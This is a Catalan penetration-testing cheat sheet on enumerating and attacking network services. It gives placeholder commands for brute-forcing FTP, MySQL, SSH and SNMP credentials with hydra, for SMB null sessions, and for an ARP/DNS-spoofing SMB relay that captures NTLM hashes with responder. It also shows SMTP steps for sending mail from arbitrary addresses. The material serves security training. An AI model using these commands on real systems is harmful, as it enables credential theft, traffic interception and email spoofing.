# Service analysis
## FTP
El servei de _File Transfer Protocol_, FTP, serveix per la transferència de fitxers entre dos hosts de diferent o mateixa xarxa, amb la forma client-servidor. És molt comú el seu ús en servidors que tinguin serveis web configurats, ja que d'aquesta manera es pot afegir, treure i modificar arxius del servidor web sense haver d'accedir directament al sistema i en un entorn "controlat". La informació no viatja xifrada, pel que es pot interceptar i llegir (sempre que no s'utilitzi SFTP, que afegeix una capa SSH), i normalment es necessiten credencials per poder accedir a la comunicació. 
La enumeració d'aquest servei es basa en:
- Provar si hi ha el login anònim activat
- Enumeració d'usuaris (si la versió ho permet)
- Cerca de vulnerabilitats associades
- Força bruta de credencials
- Fer un esquema de tots els directoris i fitxers
- Descarregar tots els arxius trobats
- Revisar la informació i les metadades de cada arxiu
```bash
ftp [ip] [port] # Anonymous login
	Username: 'anonymous'
	Password: ''

hydra -L [user file] -P [pass file] ftp://[ip] # Força bruta de credencials

# FTP Commands:
ls # llistar arxius del directori
cd [directori] # canviar de directori
mget * # descarregar tots els arxius
get [arxiu] # descarregar un sol arxiu
```
## SMB
És un protocol de client-servidor molt semblant a FTP en funcionalitat però que només opera en xarxes locals. La seva funció principal és la de transferència d'arxius i directoris però també s'encarrega de l'intercanvi d'informació entre diferents processos del sistema i en la gestió de recursos de xarxa com impresores o enrutadors. Al llarg de la seva història, ha tingut diferents versions que han augmentat la seva seguretat i operativitat, sent la més recent la versió 3.1.1, de 2015. Requereix autenticació pel seu ús, tot i que les versions més antigues potser permeten una sessió nul·la, i cada usuari té uns "shares", uns directoris compartits, que poden ser privats o compartits amb altres usuaris. 
L'enumeració d'aquest servei es basa en:
- Provar un inici amb sessió nul·la
- Enumerar usuaris
- Enumerar shares
- Cerca de vulnerabilitats associades
- Força bruta de credencials
- Fer un esquema de tots els directoris i fitxers
- Descarregar tots els arxius trobats
- Revisar la informació i les metadades de cada arxiu
```bash
smbclient -N -L \\\\[host]\\ # NULL Session
smbclient -L \\\\[host]\\ -U [user] # Llistar shares per l'usuari (demana contrasenya)
smbclient \\\\[host]\\[share] -U [user] # Connectar-se al share del servidor SMB (demana contrasenya)

impacket-lookupsid [user]@[host] # RID Cycling
impacket-lookupsid guest@[host] --no-pass # NULL Session RID Cycling

enum4linux -a [host] # Automatitza l'enumeració a través de rpcclient

# SMB Commands:
dir [directori] # canviar de directori
ls # llistar arxius del directori
get [arxiu] # descarregar un arxiu
mget * # descarregar tots els arxius
```
##### SMB Relay Attack
Si no hi ha activada la signatura dels missatges, és possible interceptar tot el tràfic SMB, inclús els missatges d'autenticació, i obtenir hashes NTLM amb els quals poder-se autenticar. Els passos per fer aquest atac són:
1. Fer-se passar pel servidor SMB a través d'ARP Spoofing i DNS Poisoning
2. Interceptar un missatge d'autenticació
3. Reenviar aquesta autenticació al servidor legítim
4. Accedir al servei SMB
```bash
# Crear un DNS Responder propi
echo "[local-ip] *.[domini]" > [arxiu]
dnsspoof -i [iface] -f [arxiu]

# MiTM entre la gateway i la víctima
echo 1 > /proc/sys/net/ipv4/ip_forward # Activar redireccionament IP
arpspoof -i [iface] [gateway_ip] [victima_ip] # Entre gateway i victima
arpspoof -i [iface] [victima_ip] [gateway_ip] # Entre víctima i gateway

# Captura el tràfic SMB (NTLM Hash)
responder -I [iface] -v
```
> Samba utilitza el servei RPC per temes de debug i configuració. ÉS una eina super potent que permet enumerar gran quantitat de coses amb credencials o NULL Session. Tota la info a [RPC Enum](https://www.hackingarticles.in/active-directory-enumeration-rpcclient/).
## MySQL
Sistema de gestió de bases de dades relacional. Tot i que no és l'únic i és possible trobar-ne d'altres i d'altres tipus, MySQL és el més comú, ja que és de codi obert. Normalment està configurat per operar en el port 3306 del localhost, pel que no es pot accedir des d'un host extern i la seva enumeració correspon més a la part de post-explotació, tot i que és possible que s'hi pugui accedir remotament en certs casos, per necessitat del propi sistema.
L'enumeració consisteix en:
- Força bruta de credencials
- Cercar vulnerabilitats de la versió utilitzada
- Provar l'accés remot
- Credencials per defecte
- Força bruta de l'usuari root (usuari per defecte)
```bash
mysql -u [usuari] -p # -p de prompt per la contrasenya
hydra -L [user_file] -P [pass_file] mysql://[host] # Força bruta
hydra -l root -P [pass_file] mysql://[host] # Força bruta a l'usuari root
```
## SSH
_Secure SHell_ és un protocol que permet l'enviament de comandes a un host remote a través d'una connexió segura. Tot i que també té autenticació i encriptació per contrasenya, és molt comú que utilitzi claus amb criptografia asimètrica. A banda de l'execució remota de comandes, també ofereix la possibilitat de tunelitzar la connexió o redireccionar ports.
L'enumeració de SSH consisteix en:
- Cercar vulnerabilitats conegudes de la versió utilitzada
- Força bruta de credencials
```bash
hydra -L [user_file] -P [pass_file] ssh://[host]
```

## SMTP
És el protocol de transferència sobre el qual viatgen els correus electrònics a través d'Internet. Utilitza SSL o TLS per establir la connexió entre l'emissor i el receptor. Per entendre-ho, els servidors SMTP són com "les oficines de Correus de la informàtica". És possible connectar-se directament al servidor SMTP i enumerar la següent informació:
- Correus vàlids
- Capacitats del servidor
Fins i tot, si ho permet la configuració, es pot utilitzar el servidor per enviar correus amb el seu propi domini i una adreça arbitrària.
```bash
nc [domini] [port_SMTP]

smtp-user-enum [wordlist] -t [domini] # Enumeració de correus

# Si permet la connexió:
VRFY [correu] # Si existeix el correu especificat
HELO || EHLO [domini] # Llistar capacitats del servidor
# Per enviar un correu:
HELO [domini]
mail from: [adreça]
rcpt to: [adreça]
data
[data]
#Per acabar la data
LF #Nova línia (Line Feed)
.
LF
```
## SNMP
_Simple Network Management Protocol_, encarregat de la gestió i monitorització de la transferència d'informació en xarxes LAN. Permet recopilar tota la informació sobre els dispositius connectats a la xarxa, pel que és bastant útil per enumerar el host. 
En la primera versió, hi ha una mena d'autenticació a través d'una "community string", necessària per l'enumeració, i en les versions posteriors es va introduir l'autenticació amb credencials d'usuari i contrasenya.
Es pot enumerar, d'aquest servei:
- Sistemes (amb SNMP activat)
- Configuració de la xarxa
- Usuaris i grups
- Informació del sistema
- Serveis i aplicacions
```bash
hydra -P [wordlist] snmp://[host] # Força bruta de community string
snmpwalk -v[versió] -c [community string] [host] # Enumeració
```
## Web Service
Els serveis web són un dels objectius més comuns, ja que es troben accessibles de forma pública i fàcil, a través de qualsevol navegador. Les principals vulnerabilitats que es poden trobar són:
- XSS
- SQLi
- CSRF
- Misconfiguracions
- Exposició d'informació sensible
- Força bruta
- Pujada de fitxes arbitraris
- DoS i DDoS
- SSRF
- Control d'Accés inadequat
- Vulnerabilitats d'aplicacions de tercers
